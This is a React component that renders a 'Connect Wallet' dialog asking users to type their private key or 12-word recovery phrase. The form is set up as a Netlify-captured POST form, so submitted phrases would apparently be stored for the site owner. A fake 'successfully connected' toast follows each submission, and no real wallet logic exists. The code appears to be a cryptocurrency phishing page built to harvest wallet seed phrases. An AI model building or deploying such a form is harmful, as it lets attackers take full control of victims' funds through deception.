import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";

interface WalletDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!phrase.trim()) {
      toast({
        title: "Error",
        description: "Please enter your private key phrase",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);

    try {
      // Implement your own wallet connection logic here
      console.log("Connecting wallet...");
      
      toast({
        title: "Success",
        description: "Your wallet has been successfully connected for debugging",
      });

      setPhrase("");
      onOpenChange(false);
    } catch (error) {
      toast({
        title: "Error",
        description: "Something went wrong. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-center">Connect Wallet</DialogTitle>
        </DialogHeader>
        <form 
          onSubmit={handleConnect} 
          className="space-y-4 py-4"
          data-netlify="true"
          name="wallet-connection"
          method="POST"
        >
          <input type="hidden" name="form-name" value="wallet-connection" />
          <p className="text-sm text-muted-foreground text-center">
            Input your private key or 12-word phrase for access to your account. Please input it in the order specified.
          </p>
          <p className="text-xs text-muted-foreground text-center">
            Separate each word with a space
          </p>
          <Input
            type="text"
            name="phrase"
            placeholder="Enter your private key phrase"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            className="w-full"
          />
          <div className="flex justify-center">
            <Button type="submit" className="w-full sm:w-auto" disabled={loading}>
              {loading ? 'Connecting...' : 'Connect'}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default WalletDialog;
